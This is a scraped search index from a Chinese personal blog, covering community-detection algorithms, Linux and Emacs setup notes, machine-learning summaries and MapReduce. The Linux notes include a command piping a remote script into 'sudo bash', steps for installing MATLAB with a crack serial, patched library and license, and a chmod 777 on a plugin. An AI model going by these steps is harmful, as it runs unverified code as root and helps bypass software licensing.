原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/03/24/church-count/) 、作者信息（Forec）和本声明。","categories":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}],"tags":[{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"},{"name":"sicp","slug":"sicp","permalink":"http://forec.github.io/tags/sicp/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}]},{"title":"复杂网络传统社区发现算法概述","slug":"community-found","date":"2016-03-12T07:26:08.000Z","updated":"2017-08-22T07:31:24.000Z","comments":true,"path":"2016/03/12/community-found/","link":"","permalink":"http://forec.github.io/2016/03/12/community-found/","excerpt":"复杂网络是复杂系统的抽象，其中一个重要特征是网络中所呈现出的社区结构。许多网络是异构的，对于构成网络的不同类型节点所组成的子图称为网络中的社区。整理了几个传统的社区发现算法流程和大致原理，记录备忘。","text":"复杂网络是复杂系统的抽象，其中一个重要特征是网络中所呈现出的社区结构。许多网络是异构的，对于构成网络的不同类型节点所组成的子图称为网络中的社区。整理了几个传统的社区发现算法流程和大致原理，记录备忘。 Kerighan-Lin算法 算法为类似模拟退火式的试探优化法，采用贪婪的策略对网络进行二分社区。其复杂度仅为O(N^2)，适用于小规模的网络，但准确度不高，并且必须事先知道两个社区的规模大小。 定义增益值\\(P=\\mbox{两个社区内部边数}-\\mbox{两个社区之间边数}\\)，并寻找使P最大的划分。 算法流程如下 (1) 随机将整个网络中的节点划分为两个社区A和B，其节点数分别为m和n，m和n已知。 (2) 对于A和B中的每对节点\\((i, j), i\\in A, j\\in B\\)，计算将i和j交换后的\\(\\Delta P=\\mbox{交换后的P}-\\mbox{交换前的P}\\)。 (3) 选取使\\(\\Delta P\\)最大的交换节点对并更新P值。另外，每个节点仅能交换一次。 (4) 转(2)，直到A或者B二者中某个社区所有节点都已经被交换过一次。 基于Laplace图特征值的社区发现方法 一个无向图\\(G=(V, E)\\)，矩阵D是一个对角矩阵，对角线上的元素Dii是节点i的度，矩阵W是图G的邻接矩阵。拉普拉斯矩阵\\(L=D-W\\)，因此L为对称矩阵。其规定和具有的性质如下： 对于W，定义图中A、B两个子图间的权重为\\(W(A, B)=\\Sigma w_{ij}, i\\in A, j\\in B\\)。 与某个节点邻接的所有边的权值和定义为该顶点的度，即\\({di} = \\Sigma w{ij}, i\\in \\lbrace 1, \\ldots, N\\rbrace\\)。 L是一个对称半正定矩阵。 \\(L \\cdot \\vec {1}=0 \\cdot \\vec {1}\\)，因为\\(L \\cdot \\vec {1}= (D-W) \\cdot \\vec {1} = 0 \\cdot \\vec {1}\\)。 L有n个非负实特征值\\(0 = λ_1 \\leq λ_2 \\leq λ_3 \\leq \\ldots \\leq λ_n\\)。 对于任何一个实向量\\(f\\in R^n\\)，有\\(2 \\cdot f’Lf=\\Sigma w_{ij}\\cdot (f_i - f_j)^2, i, j \\in \\lbrace 1, \\ldots, N \\rbrace\\)。证明如下：$$f’Lf=f’Df-f’Wf=\\Sigma d_i\\cdot {f_i}^{2}-\\Sigma {f_i}{fj}{w{ij}}(i, j\\in {1, ldots, n})=\\frac{1}{2}\\cdot\\left(\\Sigma {d_i}{f_i}^{2}-2\\Sigma {f_i}{fj}w{ij}+\\Sigma {d_j}{fj}^{2}\\right) (i, j\\in {1, ldots, n})=\\frac{1}{2}\\cdot\\left(\\Sigma {w{ij}}({f_i}-{f_j})^{2}\\right) (i, j\\in {1, \\ldots, n})$$ 切割图的目的在于 使被切掉的各边之和最小 ，因为其代表着子图之间连接的相似度最低。 定义cut目标函数：\\(cut(A1, A2, …, Ak) = \\frac{1}{2} \\cdot (\\Sigma W(A_i, \\overline{A_i}), i\\in [1,k])\\)。该目标函数可能会导致不好的分割，例如将某个图分成一个单一点和其余的n-1个点。 定义RatioCut目标函数：Ratiocut(A1, A2, ..., Ak) = (∑W(Ai, ~Ai)/|Ai|, i∈[1,k])/2。其中|Ai|代表社区i中的节点数目。 最小化RatioCut等价于最小化f’Lf ，这里的f = (f1, f2, ..., fn)∈R^n，并且当节点vi∈A时，fi = sqrt(|~A|/|A|)，否则fi = -sqrt(|A|/|~A|)。根据上面提过的拉普拉斯矩阵性质，有2f&#39;Lf = ∑wij(fi - fj)^2, i,j from 1 to N。据此可以根据下面的推导得出，min f&#39;Lf &lt;=&gt; min RatioCut。 因为向量f是单位向量1，所以有|f|^2 = ∑(fi^2) = n，且f&#39;·1(单位向量）= ∑(fi) = 0。注意f是列向量，所以f&#39;·f是值，而f·f&#39;是一个NxN的矩阵。证明如下： 假定L·f = λ·f，这里L是Laplace矩阵，λ是矩阵L的一个特征值，f是L对应λ的特征向量。同时左乘f’，得到f&#39;·L·f = λn，因为n为定值，因此最小化f&#39;·L·f等价于最小化λ。因此需要寻找最小的特征值λ和对应的特征向量。因为Laplace矩阵最小的特征值为0，因此取第二小的特征值。更进一步，如果求出拉普拉斯矩阵的前K个特征向量，进行k-Means聚类得到k个簇，就从二聚类拓展到了k聚类。 完整的算法描述如下 构造图W，将各数据点相连，边的权重表示数据间的相似度。 计算L = D - W（D为度矩阵，即W的每一列加到对角线上） 求L的前k个特征值{λ1, λ2, …, λk}，并且按从小到大顺序排序，求出对应的特征向量vi，每个特征向量是一个Nx1的列向量。 将这k个特征向量排成Nxk的矩阵，每一行都是k维空间中的一个向量，用k-Means聚类，聚类结果中的每一行的类别就是原来图中的节点所属类别。 GN算法 分裂算法，复杂度为O(mxmxn)，需要事先知道图中社区的数目k。 1、计算每边的边介数，即网络上所有顶点对间的最短路径经过该边的次数。 2、移除最大介数边。 3、重新计算剩下边的介数。 4、重复步骤2，3，直到剩下的社区个数满足指定社区数目k。 Newman快速算法 时间复杂度为O(m(m+n))，比GN算法优化较多。是凝聚算法。 首先将每个节点设为一个单独的社区，选出使模块度Q增值最大的社区合并，如果网络中所有顶点属于同一个社区则停止合并（自底向上的合并方式）。此时已经构造出了一棵凝聚树，这棵树的第k层对应着第k种社区划分方式，最底层对应着每个节点为一个社区。最终通过选取模块度最大的层数作为最佳划分。 模块度Q的计算如下：假设有n个节点，m条边，每一步合并对应社区数目为r，组成一个rxr的矩阵e，矩阵中eij表示社区i和社区j的结点之间连边的数目在整个网络边数中所占的百分比。 流程如下： 1、初始情况下，有n个社区，m条边，若社区i（节点i）与社区j有连边，则eij=1/(2m)，否则为0。 2、按照ΔQ最大或者最小的方向合并社区，并且更新合并后的模块度。这里增量ΔQ = eij + eji - 2aiaj = 2(eij - aiaj)，这里的ai = (∑eij)/2m。 3、合并社区，并且修改矩阵e中的行列数。 4、重复步骤2、3，合并至树根。 5、计算模块度最大的社区划分。 派系过滤CPM方法 用于发现重叠社区，派系（clique）是任意两点都相连的顶点集合（完全子图）。k-派系表示网络中含有k个节点的完全子图。 社区内部节点之间相互联系密切，容易形成派系，因此社区内部的边有较大可能形成大的完全子图，而社区之间的边却几乎不可能形成较大的完全子图 =&gt; 从派系寻找社区。 首先寻找网络中的极大完全子图，利用这些完全子图来寻找k-派系的连通子图，不同的k值对应了不同的社区结构。 建立重叠矩阵：非对角元素代表两个连通派系中共享的节点数目，对角线元素代表派系的规模。将小于k-1的非对角线元素置为0，小于k的对角线元素置为1，得到k-派系连接矩阵。注意这里的k是输入参数，对结果有影响。k越大则生成的社区越大，社区的结构就越稀疏，通常k为4-6，视网络情况而定。 CPM算法基于完全子图，因此适合完全子图比较多的网络，也就是边稠密网络，其处理稀疏图的效率较低。算法效率完全取决于寻找完全子图的效率，采用离线Tarjan算法会有所提高。 Radicchi算法 与GN相同，都基于去边，但不根据边介数，而引进边聚集系数，其算法复杂度为O(m^3/n^2)，适用于稀疏图。 边聚集系数： 一条边的两个端点和这两个端点的共同邻接点之间的另外两边所组成的三角环与可能包含该边的三角环数的比值，即：Cij = Zij/min(ki-1,kj-1)，这里ki，kj是端点i和j的度，公式中的分母表示该边可能被包含的三角环的最大数，Zij表示网络中包含该边的三角环的实际数目。 如果网络中的一个三角环中含有一条连接不同社区的边，则该三角环中剩余的两边中还有一条连接同样两社区的可能性较大（因为具有社区结构的网络图中，社区之间的边较为稀少，因此包含一条给定的社区间脸变得三角形不会很多，即连接不同社区边的边聚集系数很小）。 =&gt; 每一步删掉具有最小边聚集系数的边，并重新计算剩余边的边聚集系数（这里只需要重新计算和删除掉的边有关联的边的边聚集系数），循环至网络中不存在任何边。 算法仅适用于三角环数较多的，如社会网络等。 基于点聚集的局部算法 定义连接相关度：\\(\\lambda C(\\varepsilon, j) = C{1}(j) - C{2}(j)\\)，这里\\(C{1}(j)\\)指节点j的点聚集系数，\\(C{2}(j)\\)指去除社区\\(\\varepsilon\\)内部的所有边以及与其相关联的所有边之后，节点j的点聚集系数。 定义点聚集系数：一个节点的不同邻接点互为邻接点的概率，公式为\\(C(i) = \\frac{2E(i)}{k{i}(k{i}-1)}\\)，这里ki是节点i的度，E(i)是与节点i邻接的节点之间的实际连边。整个网络\\(varepsilon\\)的点聚集系数定义为\\(C(ε) = \\frac{\\Sigma C(i)}{N}\\)。 上面定义的连接相关度用来衡量某个社区ε对其邻接点的影响力大小。如果社区ε的一个邻接点x和x的邻接点间主要通过ε通信，则ε对x有重要影响，x趋向于成为ε的一员。 以下是社区归纳点的几个约定 如果节点x有一半以上的邻接点再ε中，则\\(x\\in \\varepsilon\\)。 如果\\(C(\\varepsilon)=1\\)，这意味着ε和它的邻接点们构成连通分量，则该ε的所有邻接点∈ε。 如果该ε的一个邻接点j有C(j)=1，则j和j的邻接点都属于ε。 如果ε的邻接点j有C(j) &gt; C(ε)。并且\\(\\Delte C(\\varepsilon,j)\\)是ε的所有邻接点中最大非负值，则\\(j\\in ε\\)。 完整流程如下 以图中某个节点作为局部社区的初始状态，不断寻找j加入社区并update，直到没有符合条件的点，结束局部社区。 当所有局部社区形成后，分别计算每个社区的内度和外度，将内度小于外度的社区ε合并到与ε最紧密的社区中，直到所有社区都有内度&gt;外度。 算法缺点是受到代表社区的初始节点影响比较大。 衡量网络分解：模块度 设网络分裂为g个社区，定义gxg的矩阵e，其eij表示原网络中连接社区i和社区j中节点的边数在所有边中所占比例。e的迹表示网络中同一社区中节点的边占所有边的比例。\\(ai = \\Sigma e{ij}\\)表示连接社区i的边所占比例。有\\(Q = Tre - {|e|}^2\\)，\\(\\Sigma {ai}^{2} = \\Sigma \\left( \\Sigma e{ij} \\cdot e_{jk} \\right) = {|e|}^2 \\)。 参考博客和资料如下： July的博文《从拉普拉斯矩阵说到谱聚类》 孟岩的博文《理解矩阵（一）（二）（三）》 A Tutorial on Spectral Clustering 谱聚类的算法实现 复杂网络的社区发现算法研究 基于点聚集系数和边聚集系数的社区发现算法 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/03/12/community-found/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"图分割","slug":"图分割","permalink":"http://forec.github.io/tags/图分割/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"Linux各发行版及Emacs配置备忘","slug":"bugs-for-using-linux","date":"2016-02-29T11:42:03.000Z","updated":"2017-02-03T13:19:56.000Z","comments":true,"path":"2016/02/29/bugs-for-using-linux/","link":"","permalink":"http://forec.github.io/2016/02/29/bugs-for-using-linux/","excerpt":"不定期整理在使用各类linux发行版和Emacs时的配置，以及遇到的各类问题的解决方案。","text":"不定期整理在使用各类linux发行版和Emacs时的配置，以及遇到的各类问题的解决方案。 FedoraMysql5.1以上版本中文编码 在mysql中输入show variables like &#39;character%&#39;;查看编码配置，此时有某行为Latin1 编辑/etc/mysql/my.cnf（或在/etc/my.cnf），为各部分增加或修改为 12345678[client]default-character-set=utf8[mysqld]character-set-server=utf8collation-server=utf8_general_ciinit_connect='SET NAMES utf8'（或SET NAMES 'utf8'）[mysql]default-character-set=utf8 重启mysql，服务映射为mysqld，sudo service restart mysqld或sudo /etc/init.d/mysql restart apache服务器配置 编辑~/work/program/apache-2.4.17/conf/httpd.conf 将其中的#Listen 12.34.56.78:80下面一行的Listen 80改成监听端口，如8080 向下找到User和Group两项，在终端输入groups可以看到当前用户和所属群组，修改为当前用户及群组 向下找到ServerName，改为IP地址，如127.0.0.1:8080，通过其访问apache 向下设置DocumentRoot，为网站所在目录，访问权限修改为Require all granted（全部允许） 开机挂载非EXT分区 fedora的分区配置在/dev/下 在/mnt/下新建文件夹如Professional，fdisk -l查看所有分区 如对应分区为/dev/sdb4，则mount /mnt/Professional /dev/sdb4 编辑/etc/fstab，在最后加入/dev/sdb4 /mnt/Profession ntfs iocharset=utf8, umast=0 0 0，ntfs随分区格式改变 sqlite3API编译 gcc sqlite3.c test.c -lpthread -ldl生成a.out。 Ubuntu安装Topcoder 配置java环境，apt-get install java，或者到Java SE下载最新的jdk。 点此下载Topcoder的客户端，下载ContestAppletProd.jnlp。 安装javaws，并启动ContestAppletProd.jnlp。sudo apt-get install javaws，javaws ContestAppletProd.jnlp。 制作Topcoder桌面启动器：cd /usr/share/applications/，sudo vi TopCoder.desktop，选取png图片作为启动器图标，保存在/path/to/TopCoder/TopCoderIcon.png，将以下内容保存，两个地址为绝对地址。 12345678 [Desktop Entry] Version=1.0 Name=TopCoder Exec=javaws /path/to/TopCoder/ContestAppletProd.jnlp Terminal=false Icon=/path/to/TopCoder/TopCoderIcon.png Type=Application Categories=Development 安装插件，在这里下载TZTester、CodeProcessor和FileEdit。CodeProcessor对Python不支持。 登录Arena后，选择”Options”→”Editors”，调出新窗口，点击”Add”，在”name”栏填”FileEdit”，”EntryPoint”栏填”fileedit.EntryPoint”，路径浏览选择”FileEdit.jar”所在位置，OK保存。 “options”→”Editors”，调出新窗口，点击”Add”添加全部三个文件，包括 “FileEdit.jar”。此次”name”栏填”CodeProcessor”，”EntryPoint”栏填 “codeprocessor.EntryPoint”，路径栏浏览三个文件的位置。 选择”CodeProcessor”作为”Default Editor”，即在前面的两个白色的括号中的第一个打勾。 选定”CodeProcessor”（高亮显示），按 “Configure”。在”Editor EntryPoint”栏键入”fileedit.EntryPoint”，在 “Processor Class”栏键入 “tangentz.TZTester”，按 “Verify”，弹出窗口检查是否全部 “found”。点击后面的”configure”，选中”Write the problem description using HTML”，将”File Extension”改为”html”。在”Enter directory read/write problems to:”处填上编写程序文件的绝对路径。 安装matlab sudo mkdir /media/matlab/，sudo mount -o loop /path/to/matlab.iso /media/matlab挂载iso镜像。 cd到挂载的镜像中，./install开始图形界面安装。使用/media/matlab/crack/下的序列号。 安装完成后复制crack下的libmwservices.so到matlab安装目录下的bin/glnxa64。sudo cp /path/to/libmwservices.so /path/to/matlab-install-place/bin/glnxa64/ 进入matlab安装目录下的bin文件夹，./activate matlab对matlab激活，选中crack下的license激活。 apt-get安装matlab-support，否则打开matlab闪退。matlab-support会把matlab自动加入环境变量，并生成桌面启动器。 修改环境变量 修改系统环境变量sudo vi /etc/environment，在PATH=末尾添加:/path/to/your/dir，source /etc/environment生效。 修改当前用户环境变量sudo vi ~/.bashrc，在末尾添加export PATH=/path/to/your/dir:$PATH，source ~/.bashrc生效。 安装LaTex sudo apt-get install texlive-full sudo apt-get install texmaker 安装中文字体支持sudo apt-get install latex-cjk-all hexo等工程需要更新nodejs sudo apt-get install curl curl --silent --location https://deb.nodesource.com/setup_5.x | sudo bash - sudo apt-get install nodejs 安装libpcap库 最新版本http://tcpdump.org/release 解压后进入目录，./configure过程可能缺少flex，之后make过程可能缺少yacc（sudo apt-get install -y byacc），均需安装。 make install后运行二进制文件会提示缺少链接库，需从/usr/lib/x86_64-linux-gnu下拷贝libpcap.so.1.x.x并重命名为libpcap.so.1保存至/usr/lib下。 为Firefox安装Adobe Flash Player 从https://get.adobe.com/cn/获取.tar.gz格式的安装包。 解压install_flash_player_11_linux.x86_64.tar.gz到某目录下，得到libflashplayer.so，将该文件复制到Firefox的插件目录下，通常在/usr/lib/mozilla/plugins/，复制后chmod 777。 将解压出来的usr目录下所有内容拷贝到系统usr目录下，cp -r ./usr/* /usr/。 开机挂载非EXT分区 Ubuntu 12.10后挂载的分区记录在/dev/下，分区默认挂载点在/media/&lt;username&gt;/&lt;device&gt;。 在/media/&lt;username&gt;下新建文件夹如Professional，fdisk -l查看所有分区 如对应分区为/dev/sdb4，挂载到Professional，则mount -t fstype /dev/sdb4 /media/forec/Professional。挂载点可变。-t指定挂载的文件系统类型，常用的有 minix Linux最早使用的文件系统。 ext2 Linux目前的常用文件系统。 msdos MS-DOS 的 FAT。 vfat Win85/98 的 VFAT。 nfs 网络文件系统。 iso9660 CD-ROM光盘的标准文件系统。 ntfs Windows NT的文件系统。 hpfs OS/2文件系统。Windows NT 3.51之前版本的文件系统。 auto 自动检测文件系统。 可将经常使用的设备写入文件/etc/fastab,以使系统在每次启动时自动加载。mount加载设备的信息记录在/etc/mtab文件中。使用umount命令卸载设备时，记录将被清除。 sudo blkid查看分区UUID，编辑/etc/fstab，在文件末尾加入UUID=********** /media/forec/Professional ntfs defaults 0 1，ntfs随分区格式改变 误修改 /etc/profile 并更新 export PATH=/usr/bin:/usr/sbin:/bin:/sbin:/usr/X11R6/bin 恢复初始并修改错误的 profile 文件。 安装Google Chrome 可从此处下载Chrome，或使用wget下载，32位地址为https://dl.google.com/linux/direct/google-chrome-stable_current_i386.deb，64位地址为https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb。 下载完成后解包安装，sudo dpkg -i google-chrome-stable_current_amd64.deb，可能出现缺少依赖项类的error。 sudo apt-get -f install，处理error并安装chrome。 从终端输入google-chrome link_you_want可从chrome访问网址，或从启动器启动。 EmacsGolang的代码跳转和补全 在emacs24中安装go-mode，可通过ELPA或根据链接中的介绍手动安装。 在emacs24中安装auto-complete插件。 设置环境变量GOPATH和GOBIN，GOBIN可设为/usr/local/bin。 安装godef，go get github.com/rogpeppe/godef，sudo go install github.com/rogpeppe/godef，godef也可从此处获取。代码释义为M-x godef-describe或C-c C-d，代码跳转为M-x godef-jump或C-c C-j，代码返回为M-*。 安装gocode，go get github.com/nsf/gocode，sudo go install github.com/nsf/gocode。 修改.emacs，增加load-path：(add-to-list &#39;load-path &quot;~/.emacs.d/path/to/load-path&quot;) 将文件$GOPATH/github.com/nsf/gocode/emacs/go-autocomplete.el拷贝到$load-path目录下 修改.emacs 1(require &#39;go-autocomplete)&#10;(require &#39;auto-complete-config)&#10;(ac-config-default) 修改.emacs，使保存文件时gofmt：(add-hook &#39;before-save-hook #&#39;gofmt-before-save) 颜色关键词高亮与背景色 安装rainbow-mode，可从此处下载，或在melpa stable下载。 在.emacs中增加hook使默认激活该模式，或启动后M-x rainbow-mode激活。 123(add-to-list 'load-path \"~/.emacs.d/path-to-rainbow-mode/\")(require 'rainbow-mode)(add-hook 'prog-mode-hook 'rainbow-mode) Markdown-mode 参考 Emacs Markdown Mode。 设置后缀关联 12345678(autoload 'markdown-mode \"markdown-mode\" \"Major mode for editing Markdown files\" t)(add-to-list 'auto-mode-alist '(\"\\\\.markdown\\\\'\" . markdown-mode))(add-to-list 'auto-mode-alist '(\"\\\\.md\\\\'\" . markdown-mode))(autoload 'gfm-mode \"gfm-mode\" \"Major mode for editing GitHub Flavored Markdown files\" t)(add-to-list 'auto-mode-alist '(\"README\\\\.md\\\\'\" . gfm-mode)) 拼写检查 参考 flyspell 和 flycheck 是 Emacs 用于拼写检查的前端，配合 Aspell、ispell 或者 hunspell 工作。 Linux 下可下载 Aspell 的源码，直接 make 并 install 即可。安装后需安装所需的 词典。 Windows 下需使用二进制版本安装（msys2安装的aspell 会占用大量 CPU 并卡住）。当前（2017.2）最新的 Aspell Win32 版本，安装 Aspell 后再安装对应词典，词典会默认装载到 Aspell 安装目录下。 Flyspell 认为拼写检查程序为 ispell，需向 .emacs 或 .spacemacs 的 user-init 中添加 (setq-default ispell-program-name &quot;aspell&quot;)。重启后可用 M-x flyspell-mode 启动。 实时检查会拖慢 Emacs 的速度，最好在平时关闭 flyspell，等到待检查部分完成后，将该部分 mark 起来，并使用 M-x ispell-region。要对整篇文章进行检查，可使用 M-x ispell-buffer 进行人机交互的单词检查。人机交互时常用的命令包括： &lt;SPC&gt;：跳过当前单词（在 Spacemacs 中也是单纯的空格而非 M-m。 r new &lt;RET&gt;：拥新输入的单词替换拼写错误的单词。 R new &lt;RET&gt;：拥新输入的单词替换拼写错误的单词，并且 flyspell 会询问是否替换掉文章中其他地方出现的类似错误。 a：在当前区域中将提示的拼写错误作为正确的拼写。 A：在当前 buffer 中将提示的拼写错误作为正确的拼写。 i：将当前单词插入个人字典中，此后 Aspell 会将其当作正确的单词对待。 u：插入当前单词的小写形式到字典中。 x：退出单词拼写检查并将光标返回拼写检查开始前的位置。 Emacs 拼写部分手册 其它 C-x * c 启动计算器（逆波兰），C-x * t 打开计算器帮助。 Spacemacs 配置 Spacemacs 的配置多在 .spacemacs 文件中，其中 dotspacemacs-configuration-layers 中代表启动时加载的 layer，例如 c++ 则添加 c-c++。 user-init 中加载个人在 EMACS 启动前需要的配置项。 个人启动项配置 (global-linum-mode 1)：始终开启行号，如果当前 EMACS 较卡，则可 M-x linum-mode 关闭行号，会略加快速度。 启动 c++ layer： 1(setq-default dotspacemacs-configuration-layers&#10; &#39;((c-c++ :variables&#10; c-c++-default-mode-for-headers &#39;c++-mode)))&#10;(setq-default dotspacemacs-configuration-layers&#10; &#39;((c-c++ :variables c-c++-enable-clang-support t))) 解决 Flyspell 模式报错（需先在 msys2 中安装 aspell 和 aspell-en 字典，但尽量从官网下载 Win32 版本的 aspell 和字典，msys2 安装的 aspell 有时会卡死）： 1(setq-default ispell-program-name &#34;aspell&#34;)&#10;(ispell-change-dictionary &#34;american&#34; t) 参考资料： 活用 Emacs 的单词拼写检查功能 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/29/bugs-for-using-linux/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[{"name":"Emacs","slug":"Emacs","permalink":"http://forec.github.io/tags/Emacs/"},{"name":"Mistakes","slug":"Mistakes","permalink":"http://forec.github.io/tags/Mistakes/"},{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"《机器学习实战》总结","slug":"marhinelearningsummary","date":"2016-02-27T06:49:09.000Z","updated":"2017-08-22T07:31:12.000Z","comments":true,"path":"2016/02/27/marhinelearningsummary/","link":"","permalink":"http://forec.github.io/2016/02/27/marhinelearningsummary/","excerpt":"书中的很多算法解决了此前的一些疑惑，让我一些拙劣的思维方式得到了一些提升，也让许多问题成为可能。从数据中挖掘重要特征是一件很有意义的事，这个过程让我更能理解数学的重要性。","text":"书中的很多算法解决了此前的一些疑惑，让我一些拙劣的思维方式得到了一些提升，也让许多问题成为可能。从数据中挖掘重要特征是一件很有意义的事，这个过程让我更能理解数学的重要性。 概念总结 分类和回归属于监督学习，分类主要用于预测标称型数据，回归主要用于预测数值型数据。监督学习指算法知道预测什么，对应的无监督学习处理的数据没有类别信息，也不会给定目标值，将数据集合分成由类似的对象组成的多个类的过程称为聚类。 处理数据之前需要理解数据特征：特征值是离散型变量还是连续性变量，特征值中是否存在缺失的值，何种原因造成缺失值，数据中是否存在异常值，某个特征发生的频率如何等。 开发过程：收集数据，准备输入数据，分析输入数据，训练算法（无监督学习不需要）。 kNN近邻算法：精度高、对异常值不敏感、无数据输入假定，但计算复杂度高、空间复杂度高，可应用在数值型和标称型。该算法通过计算目标数据到训练数据的距离，根据距离排序，选择排名靠前的几个训练数据类型，投票决定预测类型。 决策树：计算复杂度不高、输出结果容易理解、对中间值缺失不敏感、可处理不相关特征，但可能会产生过度匹配问题，适用于数值型和标称型。该算法每次选择一个特征进行划分，依照该特征划分可以获得最大的信息增益，划分后将该特征移除，一直到所有训练数据均已分类成功或所有特征均已经使用。 朴素贝叶斯：在数据较少的情况下依然有效、可以处理多类别问题，但对于输入数据的准备方式较为敏感，适用于标称型数据。该算法通过对目标数据计算概率，选择使概率最大的分类。算法需要一个先验输入，例如邮件分类系统中，需要对此前收到的邮件进行统计，计算垃圾邮件占比。 Logistic回归：计算代价不高，易于理解和实现，但容易欠拟合，分类精度可能不高，适用于数值型和标称型。该算法使用海维塞德阶跃函数进行二值分类，训练算法的过程就是在寻找回归系数，分类时用回归系数和输入向量的点乘计算阶跃函数的参数。寻找回归系数的过程可以使用梯度上升法，选择移动量最大的方向来迭代更新系数。 支持向量机：泛化错误率低、计算开销不大、结果易解释，但对参数调节和核函数的选择敏感，院士分类器不加修改仅适用于处理二类问题。适用于数值型和标称型数据。其中一种实现是通过序列最小优化（SMO）算法，可以通过核函数将SVM拓展到无法线性划分的数据集。SVM的过程主要是寻找最佳分类间隔，这是一个线性平面，其最小间隔最大。核函数可以把低维空间数据映射到无穷维度，因此在当前空间无法线性划分的数据在无穷维度可以线性划分。 AdaBoost元算法：元算法是对其他算法进行组合的一种方式，其泛化错误率低，易编码、可以应用在大部分分类器上，对离群点敏感。适用于数值型和标称型数据。该算法使用多个弱分类器如单层决策树（某个特征基于阈值分类），每个弱分类器的权值不同，这个权值随着迭代次数增加不断更新。同时，每个样本也具有权重，如果某个样本被错误分类，则下次该样本的权重增加。最终对每个弱分类器的分类结果加权作为最终分类结果。 回归：回归结果易于理解、计算不复杂，但对非线性的数据拟合不好。适用于数值型和标称型。标准线性回归可以直接用矩阵计算，局部加权线性回归减少欠拟合现象，为数据点附近的其他数据点赋予不同权重。当数据的矩阵非奇异时，可以使用岭回归或者与lasso类似的前向逐步回归来约束回归系数。回归中的偏差指回归结果和真实结果的误差，而方差则指多次回归后不同回归系数之间的差异。 树回归：可以对复杂和非线性的数据建模，但结果不易理解。适用于数值型和标称型数据。回归树的叶节点包含单个值，而模型树的叶节点包含一个线性方程。剪枝可以降低决策树的复杂度，包含预剪枝和后剪枝。 K-均值聚类：无监督学习，可以随即初始化k个簇，或者采用二分K-均值聚类算法，从一个簇开始划分。 Apriori算法:算法基于Apriori原则，如果某个项集不频繁，则其超集必然不频繁。可以从频繁相集中挖掘关联规则，如果某条规则不满足最小可信度要求，那么该规则的所有子集也不满足最小可信度要求。 FP-growth算法：算法速度快，只需要扫描整个数据集两次，但实现比较困难，在某些数据集上效率可能下降。适用于标称型数据。FP树的构造有些类似字典树，但增加了一个headerTable用于存储每个元素在树中首次出现的位置，并且为每个节点增加了parent域，从而可以从叶节点向上追溯，创建条件树，发现频繁项集。 PCA：PCA可以降低数据的复杂性，识别最重要的多个特征。但该步骤不一定重要，有可能损失有用信息。适用于数值型数据。另外几种降维技术有FA和ICA。算法通过协方差矩阵来计算主成分，并作为主要坐标轴，并继续计算次成分。当前几个成分覆盖了大部分方差时，可以认为后面的特征都是噪声。 SVD：SVD是一种矩阵分解技术，将矩阵Data分解成U、∑和V^T三个矩阵，其中∑矩阵为对角矩阵，并且从左到右数据逐渐减小，在r个数据后认为0。可以用这r个数据重构原矩阵的近似矩阵，计算方法为U[:r]*∑[:r]*VT[r:]。 MapReduce框架：当数据运算需求超过当前资源的运算能力，可以考虑借助MapReduce框架并行计算，利用网络服务提供的租赁资源。大部分情况下并不需要MapReduce。 资源 美国加州大学欧文分校的机器学习数据资源 Amazon公众大数据库 Data.gov的政府数据 Data.gov的美国国家网站超链接列表，这些网站提供开放性数据 Infochimps的开放数据集 机器学习问答论坛 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/27/machinelearningsummary/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 15 - MapReduce框架）","slug":"machinelearning15","date":"2016-02-27T06:32:18.000Z","updated":"2017-08-22T07:30:08.000Z","comments":true,"path":"2016/02/27/machinelearning15/","link":"","permalink":"http://forec.github.io/2016/02/27/machinelearning15/","excerpt":"MapReduce是一个分布式计算框架，可以将单个计算作业分配给多台计算机执行。","text":"MapReduce是一个分布式计算框架，可以将单个计算作业分配给多台计算机执行。 MapReduce工作流程 MapReduce框架的优点是可以短时间内完成大量工作，缺点是算法必须经过重写，需要对系统工程有一定理解。适用于数值型和标称型数据。 MapReduce工作流程是：单个作业被分成很多小份，输入数据被切片分发到每个节点，各个节点只在本地数据上做运算，对应的运算代码称为mapper，该过程称为map阶段。每个mapper的输出通过某种方式组合（一般还会做排序），排序后的结果再被分成小份分发给各个节点进行下一步处理。第二步处理阶段称为reduce，对应运行代码称为reducer。reducer的输出为程序最终执行结果。 在任何时候，每个mapper或reducer之间都不进行通信。每个节点值处理自己的事务，且在本地分配的数据集上计算。 主节点控制MapReduce的作业流程，数据被重复存放在不同的机器上防止某个机器失效。mapper和reducer传输的数据形式为key/value对。 MapReduce上的机器学习 简单贝叶斯：直接使用reducer将各个mapper的结果相加 